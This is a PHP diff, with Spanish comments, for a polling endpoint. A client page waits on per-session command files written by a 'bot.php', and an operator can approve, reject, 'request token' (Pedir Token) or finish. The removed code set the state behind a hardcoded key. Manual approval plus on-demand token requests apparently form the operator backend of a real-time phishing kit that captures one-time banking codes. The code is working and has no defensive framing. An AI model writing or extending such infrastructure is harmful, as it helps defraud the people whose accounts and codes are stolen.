@@ -1,24 +1,29 @@
 <?php
-$key = 'op2025';
-$f   = __DIR__ . '/.ws';
+// Cliente: polling del estado — lee acciones/{uid}.txt (escrito por bot.php)
+session_start();
 
-// Operador: establecer estado (devuelve página HTML para no descargar JSON)
-if (isset($_GET['s'], $_GET['k']) && $_GET['k'] === $key) {
-    $allowed = ['wait', 'continue', 'error', 'token', 'finish'];
-    $v = in_array($_GET['s'], $allowed, true) ? $_GET['s'] : 'wait';
-    file_put_contents($f, $v);
-    $label = ['wait'=>'Espera','continue'=>'Aprobado','error'=>'Rechazado','token'=>'Pedir Token','finish'=>'Finalizado'][$v] ?? $v;
-    header('Content-Type: text/html; charset=utf-8');
-    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OK</title>'
-        .'<style>body{font-family:sans-serif;text-align:center;padding:52px;background:#f4f4f4}h2{color:#1a3a6e;font-size:22px}p{color:#555}</style></head>'
-        .'<body><h2>&#10003; Enviado</h2><p>Estado establecido: <b>' . htmlspecialchars($label) . '</b></p></body></html>';
+header('Content-Type: application/json; charset=utf-8');
+
+$uid = $_SESSION['wait_uid'] ?? null;
+if (!$uid) {
+    echo json_encode(['s' => 'wait']);
     exit;
 }
 
-// Cliente: obtener estado (auto-reset a 'wait' tras entregarlo)
-header('Content-Type: application/json; charset=utf-8');
-$state = trim(@file_get_contents($f) ?: 'wait');
-if ($state !== 'wait') {
-    file_put_contents($f, 'wait');
+$safe = preg_replace('/[^a-zA-Z0-9_-]/', '', $uid);
+$f    = __DIR__ . '/acciones/' . $safe . '.txt';
+
+if (file_exists($f)) {
+    $cmd = strtoupper(trim(file_get_contents($f)));
+    unlink($f);
+    $map = [
+        'CONTINUE' => 'continue',
+        'TOKEN'    => 'token',
+        'ERROR'    => 'error',
+        'FINISH'   => 'finish',
+        'INVALID'  => 'error',
+    ];
+    echo json_encode(['s' => $map[$cmd] ?? 'wait']);
+} else {
+    echo json_encode(['s' => 'wait']);
 }
-echo json_encode(['s' => $state]);
